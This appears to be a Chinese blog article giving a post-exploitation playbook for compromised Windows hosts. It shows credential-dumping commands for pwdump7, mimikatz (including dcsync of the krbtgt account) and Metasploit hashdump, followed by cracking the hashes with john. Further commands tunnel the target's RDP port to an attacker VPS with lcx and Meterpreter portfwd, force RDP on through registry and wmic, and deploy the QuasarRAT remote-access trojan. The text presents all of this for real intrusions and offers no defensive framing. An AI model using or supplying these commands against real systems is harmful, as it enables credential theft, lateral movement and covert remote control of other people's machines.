> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1owSaiWVGVWB-CGIqbqbsA)

**Hash读取**

在提权成功拿到system权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的hash值。工具读取hash的本质都是利用system权限去读取Windows的SAM文件。在Windows2012版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012之后不能再读内存中的明文，只能用mimiakatz等工具读取hash值然后进行破解。

* * *

  

---

**一、使用pwdump7获取hash**  

------------------------

pwdump7是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：

Win7  
![图片](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSZ1ibb67DE25Xo1woLoamPP2C7V9awN0vibIibg0iaSFop9DVnBW1LM9VwQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)  

Windows2008  
![图片](https://mmbiz.qpic.cn/mmbiz_png/flBFrCh5pNauqx0DMFQMoNS06htq68oSiaBl5dibCUhcPsGibJ0ogIVOb1YVWOFERzZqpicGUZoPQ65bwFLzlB1Hlw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)  
Windows2003：  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

拿到hash直接破解：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

* * *

  

---

**二、mimikatz抓取hash**
--------------------

  

mimikatz在内网的作用远不止于hash读取，域中的黄金、白银票据伪造，权限维持都可以通过它完成等。这里只介绍他的hash读取功能：

```
项目地址：https://github.com/gentilkiwi/mimikatz/releases
```

mimikatz需要高权限运行才能发挥，至少是administrator权限 ，抓取密码的命令需要system权限

  
**1.抓取密码需要先进行提权**  

```
`#提升权限（从administrator提升到system）``privilege::debug`
```

**2.抓取hash**

```
`#获取当前在线用户的明文密码（需要高权限运行）``sekurlsa::logonpasswords``#获取当前此计算机存在过用户的NTLMHASH` `lsadump::lsa /patch`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**3.mimikatz其他命令**

```
`#导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份``lsadump::sam SYSTEM.hiv` `#通过内存文件获取口令``sekurlsa::minidump lsass.dmp``sekurlsa::logonPasswords full``#拉取 rd.adsecurity.org 域中的 KRBTGT 用户帐户的密码数据``lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt``#拉取 lab.adsecurity.org 域中 ADSDC03 域控制器的计算机帐户的密码数据``lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$`
```

**4.pass.exe读取明文密码**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

window2008用getpassword.exe

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

* * *

  

---

**三、MSF抓取hash**
---------------

MSF在win7以下系统可以直接抓取hash，07以上要绕过uac才能进行抓取，抓取hash需要管理员权限。  
  
**1.hashdump抓取hash并破解  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**

将得到的hash值复制hash到新文件利用john工具进行破解：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

```
`john a.hash``# 破解hash`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**2.smart-hashdump模块**

```
`use windows/gather/smart_hashdump``set session x``run`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

**3.MSF+mimikatz**  

提权成功后执行：  

```
`#查看权限``getuid``#尝试获取system权限，一般都是失败，可利用溢出漏洞进行提权``getsystem` `#加载mimiakatz``load mimikatz``#帮助``help mimikatz``#随便输入一个a模块让他报错会显示所有可用模块``mimikatz_command -f a::` `#查看指定模块使用方法` `mimikatz_command -f hash::`
```

①抓取系统hash值

```
msv 
```

  

`![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
`

  

②抓取系统票据

```
kerberos 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

③获取系统账号信息

```
wdigest
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

④抓取hash

```
mimikatz_command -f samdump::hashes
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

⑤查看系统进程

```
mimikatz_command -f handle::list 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

  

===

  

===

**端口转发**
========

  

端口转发是转发一个网络端口从一个网络节点到另一个网络节点的行为，拿到公网shell和内网shell之后，无法直接接入目标内网，需要进行端口转发将内网的端口转发到我们的网络环境可以接入的跳板机上面从而进行连接，常见的端口转发方式有很多，例如lcx工具转发，nc反弹，socket代理， ssh隧道代理转发等等，这里暂时只对LCX工具进行介绍，其他方式后续陆续讲解。LCX端口转发步骤如下：  

* * *

  

---

**LCX端口转发**
-----------

  

**1.本地监听**

实战情况下这里的IP应该是vps主机执行此命令，VPS主机将监听接收到的1111端口转发到本地11122端口上

```
`lcx.exe -listen 1111 11122``# 端口1111是目标主机连接本地的端口``# 端口11122是将接收到的服务器内容转发端口`
```

**2.端口转发**

在目标内网设备执行此命令。将目标的3389端口转发到VPS设备192.168.1.4的1111端口上

```
lcx.exe -slave 192.168.1.4 1111 127.0.0.1 3389
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**3.成功连接  
**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**4.远程连接**

我们已经将目标内网的3389转口转发到192.168.1.4的11122端口上，此时只需要Mstsc 192.168.1.4:11122即可连接上内网主机：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

* * *

  

---

  

---

**MSF端口转发**
-----------

```
项目地址：https://www.ngrok.cc/
```

注册ngrock账号，启动转发。ngrock使用方法：[MSF配合Ngrock穿透内网](http://mp.weixin.qq.com/s?__biz=MjM5NDUxMTI2NA==&mid=2247484003&idx=1&sn=1f76ac6dc42c90ed728bd28c963d5222&chksm=a687e2ac91f06bbada1f801f2a4d00257b91c9d6df9b96029b13d454f3d402c236cea870056f&scene=21#wechat_redirect)

  

**1.建立会话**。测试net service权限也可以转发端口

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**2.端口转发**

```
`portfwd add -l 1133 -p 3389 -r 127.0.0.1``#将目标3389转发到本地的1133端口`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**3.远程连接**

```
rdesktop 127.0.0.1:1133
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

* * *

  

---

  

---

**其他**
------

  

在远程连接时总会遇见不可描述的各种疑难杂症，记录如下：

  

**1.服务端口默认被修改**  
解决办法①：

```
`#查询TermService对应PID和netstat查询的PID对应的端口号``tasklist /svc``netstat -ano | findstr PID`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

解决办法②：

```
`#读取注册表查询终端端口PortNumber的值``REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

备注：0xd3d=hex(3389)

  

解决办法③：nnmap探测(ms-wbt-server服务)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**2.服务器未开启3389**  
解决办法：强开3389

```
`#通用开3389：``wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1``#For Win2003&Win2008:``REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f``# win2012/win08通用；win7前两条适用。winxp/win03未测验权限需要run as administrator:``wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1``wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1``reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`
```

**3.服务器网络环境处于内网**：  
解决办法：端口转发

  

**4.防护验证规则/IP或计算机名**：  
解决办法：找IP/计算机名白名单。如果真遇上这种情况又找不着白名单的话，在3389这一块算是交代了，可以换一种思路，上远控：

* * *

**QuasarRAT远控**  

Quasar提供高稳定性和简单易用的用户界界面，相对于其他远控工具干净简约且开源。据说基本支持Windows大部分版本。这里仅作简单的使用方法介绍，不到万不得已不建议上远控。  

```
项目地址：https://github.com/quasar/QuasarRAT/release
```

**1.生成payload  
![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**  

**2.开启监听**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**3.靶机执行payload，返回会话**  
需要靶机支持dotnet4.0环境，且使用管理员权限运行payload。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**4.为所欲为**

* * *

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)